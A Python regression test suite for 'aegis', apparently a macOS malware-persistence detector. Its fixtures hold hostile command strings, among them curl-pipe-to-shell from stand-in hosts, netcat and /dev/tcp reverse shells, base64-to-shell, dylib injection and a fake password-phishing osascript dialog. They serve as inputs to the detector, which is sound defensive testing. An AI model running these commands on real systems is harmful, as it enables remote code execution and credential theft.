#!/usr/bin/env python3
"""Regression suite for aegis — one test per bug found in the battle-test pass.

Zero third-party deps (stdlib `unittest` only), matching the tool's own trust
model. Fully sandboxed: every ~/.aegis path, the persistence/hot dirs, and
`notify` are redirected into a per-test tmp dir, so this NEVER reads or writes
real state and NEVER fires a desktop notification. Each test is named for the
finding it pins and would FAIL against the pre-fix code.

Run:  python3 -m unittest discover -s tests        (from the repo root)
  or: python3 tests/test_regression.py
"""
import json
import os
import plistlib
import subprocess
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402


class Sandbox(unittest.TestCase):
    """Base: redirect all aegis state/scan surfaces into a throwaway tmp dir."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aegis_rt_")
        self.state = os.path.join(self.tmp, ".aegis")
        self.pers = os.path.join(self.tmp, "LaunchAgents")
        self.hot = os.path.join(self.tmp, "hot")
        for d in (self.state, self.pers, self.hot):
            os.makedirs(d)

        self._saved = {}
        overrides = {
            "STATE_DIR": self.state,
            "BASELINE": os.path.join(self.state, "baseline.json"),
            "FINDINGS_LOG": os.path.join(self.state, "findings.jsonl"),
            "LATEST_MD": os.path.join(self.state, "latest.md"),
            "LATEST_JSON": os.path.join(self.state, "latest.json"),
            "SEEN": os.path.join(self.state, "seen.json"),
            "SIGCACHE": os.path.join(self.state, "sigcache.json"),
            "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
            "RUN_LOG": os.path.join(self.state, "run.log"),
            "SELFSTATE": os.path.join(self.state, "selfstate.json"),
            "SELF_PLIST": os.path.join(self.state, "com.charlie.aegis.plist"),
            "PERSISTENCE_DIRS": [self.pers],
            "HOT_DIRS": [self.hot],
            # New baseline-diffed surfaces read real machine state (shell rc,
            # profiles, browser extensions) — pin them empty so tests are
            # deterministic and never depend on the dev host. Individual tests
            # override a single surface to exercise it.
            "SHELL_RC_FILES": [],
            "EXTRA_PERSIST_FILES": [],
            "EXTRA_PERSIST_DIRS": [],
            "BROWSER_EXT_ROOTS": [],
            "IDE_EXT_ROOTS": [],
            # Behavioral-tier surfaces likewise read the live host (shell history,
            # /tmp staging, wallet apps, canaries, XProtect). Pin them empty/sandboxed
            # so cmd_scan-level tests are deterministic; dedicated tests point a
            # single global at fixture data to exercise it.
            "SHELL_HISTORY_FILES": [],
            "STAGING_DIRS": [],
            "WALLET_CONFIG_FILES": [],
            "WALLET_APP_BINS": [],
            "XPROTECT_BUNDLES": [],
            "CANARY_DIRS": [],
            "CANARY_STATE": os.path.join(self.state, "canaries.json"),
            # The listener surface shells to lsof (live host state). Point it
            # at /usr/bin/true (rc 0, no output ⇒ empty snapshot) so scan-level
            # tests are deterministic; listener tests call the parse/diff
            # helpers directly on fixture data.
            "LSOF_LISTEN_CMD": ["/usr/bin/true"],
            "_sigcache": {},
        }
        for k, v in overrides.items():
            self._saved[k] = getattr(aegis, k)
            setattr(aegis, k, v)

        self.notifications = []
        self._saved["notify"] = aegis.notify
        aegis.notify = lambda title, msg: self.notifications.append((title, msg))
        # check_processes()/check_behavior() read the live process table and
        # check_xprotect() shells out to `log show`; all three are non-deterministic
        # on a dev host (what's running / installed varies). Stub them to empty for
        # cmd_scan-level tests — dedicated tests pull the real function from
        # self._saved[...] or call the pure helpers (_argv_signals) directly.
        for fn in ("check_processes", "check_behavior", "check_xprotect"):
            self._saved[fn] = getattr(aegis, fn)
            setattr(aegis, fn, (lambda *a, **k: []))

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        subprocess.run(["rm", "-rf", self.tmp], check=False)

    # helpers -------------------------------------------------------------
    def write_plist(self, name, program_args, program=None, run_at_load=True):
        p = os.path.join(self.pers, name)
        d = {"Label": name[:-6], "RunAtLoad": run_at_load}
        if program is not None:
            d["Program"] = program
        if program_args is not None:
            d["ProgramArguments"] = program_args
        with open(p, "wb") as f:
            plistlib.dump(d, f)
        return p

    def adhoc_binary(self, path):
        """A real ad-hoc-signed Mach-O (clang's default) at `path`."""
        src = os.path.join(self.tmp, "src.c")
        with open(src, "w") as f:
            f.write("int main(){return 0;}")
        subprocess.run(["clang", "-o", path, src], check=True,
                       capture_output=True)
        return path


# --------------------------------------------------------------------------- #
# F1 — signed-interpreter + hostile payload must score >= HIGH (else it never
# notifies, so the #1 AMOS/Poseidon launchd pattern is invisible).
# --------------------------------------------------------------------------- #
class TestHostileArgsSeverity(Sandbox):
    def _sev(self, args, program=None):
        rec = {"label": "x", "program": program or args[0], "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True}
        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
        return fs[0]["severity"]

    def test_bash_c_curl_pipe_sh_is_high(self):
        sev = self._sev(["/bin/bash", "-c", "curl -fsSL http://evil/x | sh"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_osascript_inline_is_high(self):
        sev = self._sev(["/usr/bin/osascript", "-e", 'do shell script "curl evil"'])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_python_inline_c_is_high(self):
        sev = self._sev(["/usr/bin/python3", "-c", "import os;os.system('curl x')"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_curl_fetch_in_args_is_high(self):
        sev = self._sev(["/usr/bin/curl", "-o", "/tmp/x", "http://evil.example/x"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_benign_interpreter_agent_stays_low(self):
        # A plain apple-signed program with innocuous args must NOT be inflated —
        # guards against the fix becoming a false-positive cannon.
        sev = self._sev(["/bin/echo", "hello"])
        self.assertEqual(sev, "LOW", sev)

    def test_legit_script_in_dotdir_is_not_inflated(self):
        # Tools legitimately live in ~/.local, ~/.cargo, ~/.pyenv … — a launchd
        # agent running such a script (no inline flag, no fetch) must NOT be HIGH,
        # or the fix becomes a false-positive cannon that breaks 'alert rarely'.
        for path in ("/Users/me/.local/bin/tool", "/Users/me/.cargo/bin/rg",
                     "/Users/me/.pyenv/shims/python"):
            sev = self._sev(["/bin/bash", path])
            self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"],
                            "%s -> %s (false positive)" % (path, sev))

    def test_oracle_is_discriminating(self):
        # Mutation check: if _hostile_args is neutered, the HIGH assertion flips.
        saved = aegis._hostile_args
        aegis._hostile_args = lambda args: False
        try:
            sev = self._sev(["/bin/bash", "-c", "curl http://evil | sh"])
            self.assertEqual(sev, "LOW")  # proves the test depends on the mechanism
        finally:
            aegis._hostile_args = saved


# --------------------------------------------------------------------------- #
# F2 — a corrupt baseline must NOT silently re-baseline (erasing tamper evidence).
# --------------------------------------------------------------------------- #
class TestCorruptBaseline(Sandbox):
    def test_corrupt_baseline_alerts_and_does_not_retrust(self):
        aegis.cmd_scan(quiet=True)  # clean first-run baseline
        # attacker plants a new adhoc launch item AND corrupts the baseline
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_pl")])
        with open(aegis.BASELINE, "w") as f:
            f.write("{ this is not valid json ")
        self.notifications.clear()
        aegis.cmd_scan(quiet=True)
        with open(aegis.LATEST_JSON) as fh:
            data = json.load(fh)
        fps = [x["fingerprint"] for x in data["findings"]]
        self.assertIn("integrity:baseline:corrupt", fps)
        # the planted malware is re-surfaced (not folded into known-good)…
        self.assertTrue(any(f["category"] == "persistence"
                            and "evil" in f["detail"].lower()
                            for f in data["findings"]))
        # …and something HIGH+ actually notified (not silent).
        self.assertTrue(self.notifications)
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_pl"], check=False)


# --------------------------------------------------------------------------- #
# F3 — first-run silence is for PERSISTENCE only; a live hot-dir threat present
# at install must still alert (and keep being alertable, not swallowed by `seen`).
# --------------------------------------------------------------------------- #
class TestFirstRunScoping(Sandbox):
    def setUp(self):
        super().setUp()
        # Isolate the surface under test: stub the two checks that read real
        # machine state (hardening CLIs, running processes) so the result is
        # deterministic regardless of what this host happens to be running.
        self._saved_checks = (aegis.check_hardening, aegis.check_processes)
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []

    def tearDown(self):
        aegis.check_hardening, aegis.check_processes = self._saved_checks
        super().tearDown()

    def test_hotdir_threat_present_at_first_scan_notifies(self):
        self.adhoc_binary(os.path.join(self.hot, "payload"))
        aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
        self.assertTrue(self.notifications,
                        "a hot-dir threat present before install must alert")

    def test_persistence_at_first_scan_stays_silent(self):
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_p2")])
        aegis.cmd_scan(quiet=True)
        self.assertEqual(self.notifications, [],
                         "first-run persistence is baselined silently")
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_p2"], check=False)


# --------------------------------------------------------------------------- #
# F4 — a different binary reusing an allowed path must NOT be silently covered.
# --------------------------------------------------------------------------- #
class TestFingerprintContentHash(Sandbox):
    def setUp(self):
        super().setUp()
        self._h = aegis.check_hardening
        aegis.check_hardening = lambda: []

    def tearDown(self):
        aegis.check_hardening = self._h
        super().tearDown()

    def test_hotdir_fingerprint_changes_when_content_changes(self):
        p = os.path.join(self.hot, "tool")
        self.adhoc_binary(p)
        f1 = aegis.check_hot_dirs()[0]["fingerprint"]
        # replace with different content at the SAME path
        with open(os.path.join(self.tmp, "s2.c"), "w") as f:
            f.write("int main(){return 42;}")
        subprocess.run(["clang", "-o", p, os.path.join(self.tmp, "s2.c")],
                       check=True, capture_output=True)
        aegis._sigcache = {}
        f2 = aegis.check_hot_dirs()[0]["fingerprint"]
        self.assertNotEqual(f1, f2, "different binary at reused path = new finding")


# --------------------------------------------------------------------------- #
# F5/F6 — location partitions: /usr/local and /private/var/folders are risky.
# --------------------------------------------------------------------------- #
class TestRiskyLocations(Sandbox):
    def test_usr_local_is_risky(self):
        self.assertTrue(aegis.is_risky_location("/usr/local/bin/evil"))

    def test_usr_bin_still_trusted(self):
        self.assertFalse(aegis.is_risky_location("/usr/bin/ls"))

    def test_private_var_folders_is_risky(self):
        self.assertTrue(
            aegis.is_risky_location("/private/var/folders/zz/abc/T/tool"))

    def test_var_folders_still_risky(self):
        self.assertTrue(aegis.is_risky_location("/var/folders/zz/abc/T/tool"))

    def test_usr_local_process_is_inspected(self):
        # canned `ps` + forced-adhoc classifier: a /usr/local process must be
        # flagged (pre-fix it was short-circuited as trusted and never checked).
        saved_run, saved_cls = aegis.run, aegis.classify_signature
        aegis.run = lambda cmd, timeout=15: (
            ("1234 /usr/local/bin/evil\n", "", 0)
            if cmd[:2] == ["ps", "-axo"] else ("", "", 0))
        aegis.classify_signature = lambda p: {"trust": "adhoc", "team": None,
                                              "authority": None}
        try:
            # base setUp stubs check_processes to [] for determinism; this test
            # exercises the REAL one, pulled from self._saved.
            fs = self._saved["check_processes"]()
            self.assertTrue(any(f["path"] == "/usr/local/bin/evil" for f in fs))
        finally:
            aegis.run, aegis.classify_signature = saved_run, saved_cls


# --------------------------------------------------------------------------- #
# F7 — sigcache must invalidate on content change and stay one-entry-per-path.
# --------------------------------------------------------------------------- #
class TestSigcacheKeying(Sandbox):
    def test_cache_invalidates_and_does_not_orphan(self):
        p = self.adhoc_binary("/tmp/aegis_rt_sc")
        try:
            aegis.classify_signature(p)
            stat1 = aegis._sigcache[p]["stat"]
            with open(os.path.join(self.tmp, "s3.c"), "w") as f:
                f.write("int main(){return 7;}")
            subprocess.run(["clang", "-o", p, os.path.join(self.tmp, "s3.c")],
                           check=True, capture_output=True)
            aegis.classify_signature(p)
            self.assertEqual(len(aegis._sigcache), 1,
                             "one entry per path — no orphaned stale key")
            self.assertNotEqual(aegis._sigcache[p]["stat"], stat1,
                                "stat-signature refreshed on content change")
        finally:
            subprocess.run(["rm", "-f", p], check=False)


# --------------------------------------------------------------------------- #
# F8 — seen.json is bounded (an hourly-forever tool can't grow it without limit).
# --------------------------------------------------------------------------- #
class TestSeenCap(Sandbox):
    def test_cap_seen_keeps_newest(self):
        n = aegis.SEEN_MAX + 250
        # exactly SEEN_MAX "new" (2026) entries + 250 "old" (2025) ones → the cap
        # must keep precisely the 2026 block and drop every 2025 entry.
        seen = {"fp%06d" % i: ("2026" if i < aegis.SEEN_MAX else "2025")
                + "-01-01T00:00:00+00:00" for i in range(n)}
        capped = aegis._cap_seen(seen)
        self.assertEqual(len(capped), aegis.SEEN_MAX)
        self.assertTrue(all(v.startswith("2026") for v in capped.values()),
                        "cap retains the newest entries by timestamp")

    def test_cap_seen_noop_under_limit(self):
        seen = {"a": "2026-01-01T00:00:00+00:00"}
        self.assertIs(aegis._cap_seen(seen), seen)


# --------------------------------------------------------------------------- #
# F-eff — the dead `launchctl print-disabled system` call is gone.
# --------------------------------------------------------------------------- #
class TestNoDeadLaunchctlCall(Sandbox):
    def test_print_disabled_not_invoked(self):
        calls = []
        saved = aegis.run

        def rec(cmd, timeout=15):
            calls.append(cmd)
            return ("", "", 0)

        aegis.run = rec
        try:
            aegis.check_hardening()
        finally:
            aegis.run = saved
        self.assertFalse(
            any(c[:2] == ["launchctl", "print-disabled"] for c in calls),
            "the unused launchctl print-disabled call must be removed")


# --------------------------------------------------------------------------- #
# Invariant — never-repeat: an unchanged world raises no second alert.
# --------------------------------------------------------------------------- #
class TestNeverRepeat(Sandbox):
    def setUp(self):
        super().setUp()
        self._saved_checks = (aegis.check_hardening, aegis.check_processes)
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []

    def tearDown(self):
        aegis.check_hardening, aegis.check_processes = self._saved_checks
        super().tearDown()

    def test_second_scan_of_unchanged_world_is_quiet(self):
        aegis.cmd_scan(quiet=True)
        self.write_plist("com.evil.plist", [self.adhoc_binary("/tmp/aegis_rt_nr")])
        aegis.cmd_scan(quiet=True)
        n = len(self.notifications)
        aegis.cmd_scan(quiet=True)
        self.assertEqual(len(self.notifications), n)
        subprocess.run(["rm", "-f", "/tmp/aegis_rt_nr"], check=False)


# =========================================================================== #
# NEW DETECTION SURFACES (residual-gap coverage vs 2025-26 stealer TTPs).
# Each class pins one new detector; all are fully sandboxed and machine-agnostic.
# =========================================================================== #


# --------------------------------------------------------------------------- #
# N1 — shell startup files (T1546.004): a payload dropped in ~/.zshrc must be
# caught, and scored HIGH when it carries a download-and-run idiom.
# --------------------------------------------------------------------------- #
class TestShellRc(Sandbox):
    def _rc(self, name, body):
        p = os.path.join(self.tmp, name)
        with open(p, "w") as f:
            f.write(body)
        return p

    def test_new_hostile_rc_is_high(self):
        p = self._rc(".zshrc", "export PATH=$PATH\ncurl -fsSL http://evil/x | sh\n")
        aegis.SHELL_RC_FILES = [p]
        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertIn("pipe-to-shell", f[0]["hostile"])

    def test_new_benign_rc_is_medium_not_high(self):
        p = self._rc(".zshrc", "alias ll='ls -la'\nexport EDITOR=vim\n")
        aegis.SHELL_RC_FILES = [p]
        f = aegis.diff_shellrc({}, aegis.snapshot_shellrc())
        self.assertEqual(f[0]["severity"], "MEDIUM", "benign rc must not be HIGH")

    def test_changed_rc_alerts(self):
        p = self._rc(".zshrc", "alias ll='ls -la'\n")
        aegis.SHELL_RC_FILES = [p]
        prior = aegis.snapshot_shellrc()
        with open(p, "a") as fh:
            fh.write("nc -e /bin/sh 10.0.0.1 4444\n")
        f = aegis.diff_shellrc(prior, aegis.snapshot_shellrc())
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["title"], "Shell startup file CHANGED")
        self.assertEqual(f[0]["severity"], "HIGH")

    def test_first_sight_is_adopted_silently_then_change_alerts(self):
        # End-to-end: an existing rc at first scan must NOT alert (trust what's
        # installed); a mutation AFTER baseline must.
        p = self._rc(".zshrc", "alias ll='ls -la'\n")
        aegis.SHELL_RC_FILES = [p]
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []
        aegis.cmd_scan(quiet=True)                      # first run: adopt
        self.assertEqual(self.notifications, [])
        with open(p, "a") as fh:
            fh.write("curl http://evil | sh\n")         # attacker appends
        aegis.cmd_scan(quiet=True)
        self.assertTrue(self.notifications, "post-baseline rc change must alert")


# --------------------------------------------------------------------------- #
# N2 — DYLD code-injection env in a launchd plist scores >= HIGH even when the
# program itself is Apple-signed (AMOS/Poseidon dylib-injection persistence).
# --------------------------------------------------------------------------- #
class TestDyldInjection(Sandbox):
    def test_dyld_insert_libraries_is_high(self):
        rec = {"label": "x", "program": "/usr/bin/python3", "args": None,
               "trust": "apple", "sha256": "s", "run_at_load": True,
               "env": {"DYLD_INSERT_LIBRARIES": "/Users/me/.hidden/evil.dylib"}}
        fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
        self.assertGreaterEqual(aegis.SEV_ORDER[fs[0]["severity"]],
                                aegis.SEV_ORDER["HIGH"])

    def test_snapshot_captures_only_injection_env(self):
        import plistlib as _p
        path = os.path.join(self.pers, "com.x.plist")
        with open(path, "wb") as f:
            _p.dump({"Label": "x", "Program": "/usr/bin/true",
                     "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib",
                                              "LANG": "en_US.UTF-8"}}, f)
        snap = aegis.snapshot_persistence()
        env = snap[path]["env"]
        self.assertEqual(env, {"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib"},
                         "only injection-relevant env kept (no PII/noise)")


# --------------------------------------------------------------------------- #
# N3 — expanded hostile-arg idioms in launchd persistence (base64|sh, /dev/tcp).
# --------------------------------------------------------------------------- #
class TestExpandedHostileArgs(Sandbox):
    def _sev(self, args):
        rec = {"label": "x", "program": args[0], "args": args, "trust": "apple",
               "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_base64_decode_pipe_shell_is_high(self):
        sev = self._sev(["/bin/sh", "-lc", "echo aGkK | base64 -d | sh"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])

    def test_dev_tcp_reverse_shell_is_high(self):
        # No inline flag, no interpreter, no fetch keyword: caught purely by the
        # /dev/tcp reverse-shell idiom embedded in the arguments.
        sev = self._sev(["/opt/tool", "run", "exec 5<>/dev/tcp/10.0.0.1/4444"])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"])

    def test_benign_args_stay_low(self):
        self.assertEqual(self._sev(["/bin/echo", "hello world"]), "LOW")


# --------------------------------------------------------------------------- #
# N4 — quarantine provenance: a side-loaded (no-quarantine) hot-dir binary is
# annotated as Gatekeeper-bypassing; the download agent is parsed when present.
# --------------------------------------------------------------------------- #
class TestQuarantineProvenance(Sandbox):
    def test_origin_absent_and_present(self):
        p = os.path.join(self.tmp, "f")
        with open(p, "w") as f:
            f.write("x")
        self.assertEqual(aegis.quarantine_origin(p), (False, None))
        subprocess.run(["xattr", "-w", "com.apple.quarantine",
                        "0081;00000000;Safari;ABC", p], check=False)
        present, agent = aegis.quarantine_origin(p)
        self.assertTrue(present)
        self.assertEqual(agent, "Safari")

    def test_hotdir_side_loaded_note(self):
        payload = self.adhoc_binary(os.path.join(self.hot, "payload"))
        # clang output has no quarantine xattr → side-loaded
        f = [x for x in aegis.check_hot_dirs() if x["path"] == payload]
        self.assertTrue(f)
        self.assertFalse(f[0]["quarantined"])
        self.assertIn("side-loaded", f[0]["detail"])


# --------------------------------------------------------------------------- #
# N5 — self-protection: tamper on the monitor's own state is a HIGH signal, with
# no false positive on a machine that never installed the launchd agent.
# --------------------------------------------------------------------------- #
class TestSelfProtection(Sandbox):
    def test_log_truncation_detected(self):
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 10)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 9999})
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertTrue(any(fp.startswith("self:log:truncated") for fp in fps))

    def test_agent_removed_only_after_learned(self):
        # never installed → silent
        self.assertEqual(aegis.check_self_protection(), [])
        # learned installed, plist now gone → HIGH
        aegis.save_json(aegis.SELFSTATE, {"installed": True})
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertIn("self:agent:removed", fps)

    def test_no_false_positive_on_growing_log(self):
        with open(aegis.FINDINGS_LOG, "w") as f:
            f.write("a" * 100)
        aegis.save_json(aegis.SELFSTATE, {"findings_size": 50})  # grew, fine
        fps = [x["fingerprint"] for x in aegis.check_self_protection()]
        self.assertFalse(any("truncated" in fp for fp in fps))


# --------------------------------------------------------------------------- #
# N6 — config profiles & login hooks: a newly-installed profile or hook alerts.
# --------------------------------------------------------------------------- #
class TestProfilesAndHooks(Sandbox):
    def test_new_profile_is_high(self):
        f = aegis.diff_profiles({}, {"com.evil.mdm": True})
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertEqual(f[0]["category"], "config-profile")

    def test_preexisting_profile_not_realerted(self):
        prior = {"com.corp.wifi": True}
        self.assertEqual(aegis.diff_profiles(prior, {"com.corp.wifi": True}), [])

    def test_new_loginhook_is_high(self):
        f = aegis.diff_loginhooks({}, {"LoginHook": "/tmp/evil.sh"})
        self.assertEqual(f[0]["severity"], "HIGH")
        self.assertEqual(f[0]["category"], "persistence")


# --------------------------------------------------------------------------- #
# N7 — browser extension inventory diff: a newly-appearing extension alerts.
# --------------------------------------------------------------------------- #
class TestBrowserExtensions(Sandbox):
    def _chromium(self, extid, name):
        root = os.path.join(self.tmp, "Chrome")
        vdir = os.path.join(root, "Default", "Extensions", extid, "1.0")
        os.makedirs(vdir)
        with open(os.path.join(vdir, "manifest.json"), "w") as f:
            json.dump({"name": name}, f)
        return root

    def test_new_extension_detected_with_name(self):
        root = self._chromium("abcdefghijklmnop", "Evil Wallet Drainer")
        aegis.BROWSER_EXT_ROOTS = [(root, "chromium")]
        snap = aegis.snapshot_browserext()
        self.assertTrue(any("abcdefghijklmnop" in k for k in snap))
        f = aegis.diff_browserext({}, snap)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "MEDIUM")
        self.assertIn("Evil Wallet Drainer", f[0]["detail"])


# --------------------------------------------------------------------------- #
# N8 — upgrade safety: an EXISTING install (baseline has only "persistence")
# gaining newly-watched surfaces must adopt them SILENTLY, not alert-storm.
# --------------------------------------------------------------------------- #
class TestSurfaceAdoptionOnUpgrade(Sandbox):
    def test_existing_install_adopts_new_surface_silently(self):
        rc = os.path.join(self.tmp, ".zshrc")
        with open(rc, "w") as f:
            f.write("curl http://evil | sh\n")   # even a hostile-looking rc…
        aegis.SHELL_RC_FILES = [rc]
        aegis.check_hardening = lambda: []
        aegis.check_processes = lambda: []
        # simulate a pre-upgrade baseline: persistence key only, no "shellrc".
        aegis.save_json(aegis.BASELINE,
                        {"created": "2026-01-01T00:00:00+00:00", "persistence": {}})
        aegis.cmd_scan(quiet=True)
        # …is adopted as known-good on first sight (no alert storm on upgrade)…
        self.assertEqual(self.notifications, [],
                         "first sighting of a surface is adopted silently")
        # …and the baseline now carries the surface for future diffing.
        with open(aegis.BASELINE) as fh:
            base = json.load(fh)
        self.assertIn("shellrc", base)


# --------------------------------------------------------------------------- #
# N9 — AMOS/Atomic 2025: a launchd job running an Apple-signed interpreter
# against a HIDDEN SCRIPT in $HOME (`/bin/bash ~/.agent`) must score HIGH — the
# binary+location look safe, the script's home is the tell.
# --------------------------------------------------------------------------- #
class TestHiddenHomeScriptPersistence(Sandbox):
    def _sev(self, args, program="/bin/bash"):
        rec = {"label": "com.finder.helper", "program": program, "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_bash_hidden_home_script_is_high(self):
        sev = self._sev(["/bin/bash", os.path.join(aegis.HOME, ".agent")])
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_interpreter_tmp_script_is_high(self):
        sev = self._sev(["/usr/bin/python3", "/tmp/.x.py"], program="/usr/bin/python3")
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_legit_dotdir_tool_stays_low(self):
        # ~/.local/bin, ~/.cargo/bin etc. are conventional — must NOT inflate.
        for tool in (".local/bin/tool", ".cargo/bin/rg", ".pyenv/shims/python"):
            sev = self._sev(["/bin/bash", os.path.join(aegis.HOME, tool)])
            self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"],
                            "%s -> %s (false positive)" % (tool, sev))


# --------------------------------------------------------------------------- #
# N10 — RustBucket/BlueNoroff: a plist whose label impersonates Apple
# (`com.apple.systemupdate`) but whose program is NOT Apple-signed (hijacked
# Developer-ID cert) must be HIGH — signature checks alone wave it through.
# --------------------------------------------------------------------------- #
class TestAppleLabelImpersonation(Sandbox):
    def _sev(self, label, trust, program="/Users/x/Library/Metadata/Update"):
        rec = {"label": label, "program": program, "args": None, "trust": trust,
               "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_apple_label_developer_id_program_is_high(self):
        sev = self._sev("com.apple.systemupdate", "developer-id")
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_genuinely_apple_signed_is_not_inflated_by_this_rule(self):
        # A com.apple.* label whose program really IS Apple-signed and lives in a
        # trusted path must not be forced HIGH by the impersonation rule.
        sev = self._sev("com.apple.updater", "apple", program="/usr/bin/true")
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)


# --------------------------------------------------------------------------- #
# N11 — DPRK "Hidden Risk": a newly-created login-scoped rc (~/.zshenv) is HIGH
# even with benign-looking content; a new interactive-only ~/.zshrc is MEDIUM.
# --------------------------------------------------------------------------- #
class TestLoginScopedRc(Sandbox):
    def _new(self, name, body="export PATH=$PATH\n"):
        p = os.path.join(self.tmp, name)
        with open(p, "w") as f:
            f.write(body)
        aegis.SHELL_RC_FILES = [p]
        return aegis.diff_shellrc({}, aegis.snapshot_shellrc())[0]

    def test_new_zshenv_is_high(self):
        self.assertEqual(self._new(".zshenv")["severity"], "HIGH")

    def test_new_zshrc_is_medium(self):
        self.assertEqual(self._new(".zshrc")["severity"], "MEDIUM")

    def test_changed_zshenv_is_medium_when_benign(self):
        p = os.path.join(self.tmp, ".zshenv")
        with open(p, "w") as f:
            f.write("export A=1\n")
        aegis.SHELL_RC_FILES = [p]
        prior = aegis.snapshot_shellrc()
        with open(p, "a") as f:
            f.write("export B=2\n")   # benign change, not a fresh install
        self.assertEqual(
            aegis.diff_shellrc(prior, aegis.snapshot_shellrc())[0]["severity"],
            "MEDIUM")


# --------------------------------------------------------------------------- #
# N12 — Objective-See "Paradox" 2025: a backdoored IDE (VSCode/Cursor) extension
# must be inventoried and a new one alerted.
# --------------------------------------------------------------------------- #
class TestIdeExtensions(Sandbox):
    def test_new_cursor_extension_detected(self):
        root = os.path.join(self.tmp, ".cursor", "extensions")
        extdir = os.path.join(root, "evil.wallet-drainer-1.0.0")
        os.makedirs(extdir)
        with open(os.path.join(extdir, "package.json"), "w") as f:
            json.dump({"name": "wallet-drainer", "displayName": "Wallet Helper"}, f)
        aegis.IDE_EXT_ROOTS = [root]
        snap = aegis.snapshot_ide_ext()
        self.assertTrue(any("evil.wallet-drainer" in k for k in snap))
        f = aegis.diff_ide_ext({}, snap)
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["category"], "ide-ext")
        self.assertEqual(f[0]["severity"], "MEDIUM")


# --------------------------------------------------------------------------- #
# N13 — Objective-See "Phexia" 2025: an interpreter (osascript) launched against
# a script in a user-writable location scores MEDIUM (logged), not LOW (buried),
# while a signed interpreter against a trusted-path script stays LOW.
# --------------------------------------------------------------------------- #
class TestInterpreterScriptTarget(Sandbox):
    def _sev(self, args):
        rec = {"label": "com.user.x", "program": args[0], "args": args,
               "trust": "apple", "sha256": "s", "run_at_load": True, "env": None}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_phexia_osascript_userlib_script_is_medium(self):
        sev = self._sev(["/usr/bin/osascript",
                         os.path.join(aegis.HOME, "Library", "gfskjsnghdjsvuxj")])
        self.assertEqual(sev, "MEDIUM", sev)

    def test_interpreter_against_trusted_script_stays_low(self):
        # /etc is not in RISKY_PREFIXES and not hidden → stays LOW.
        self.assertEqual(self._sev(["/bin/bash", "/etc/somewhere"]), "LOW")


# --------------------------------------------------------------------------- #
# N14 — BEHAVIORAL argv tier: the fileless-stealer signals. High-precision
# structural signals notify (HIGH/CRITICAL); a lone benign-installer idiom stays
# MEDIUM (below notify) so a Homebrew/rustup `curl | bash` in flight is not a HIGH.
# --------------------------------------------------------------------------- #
class TestArgvSignals(Sandbox):
    def _sev(self, argv):
        sigs = aegis._argv_signals(argv)
        if not sigs:
            return None
        return max(sigs, key=lambda s: aegis.SEV_ORDER[s[1]])[1]

    def test_osascript_password_phish_is_critical(self):
        self.assertEqual(self._sev(
            'osascript -e display dialog "System update needs your password" '
            'default answer "" with hidden answer'), "CRITICAL")

    def test_dscl_authonly_is_high(self):
        self.assertEqual(self._sev('dscl . -authonly user hunter2'), "HIGH")

    def test_quarantine_strip_is_high(self):
        self.assertEqual(self._sev('xattr -dr com.apple.quarantine /tmp/update'), "HIGH")
        self.assertEqual(self._sev('xattr -c /tmp/update'), "HIGH")

    def test_hdiutil_nobrowse_is_high(self):
        self.assertEqual(self._sev('hdiutil attach -nobrowse /tmp/x.dmg'), "HIGH")

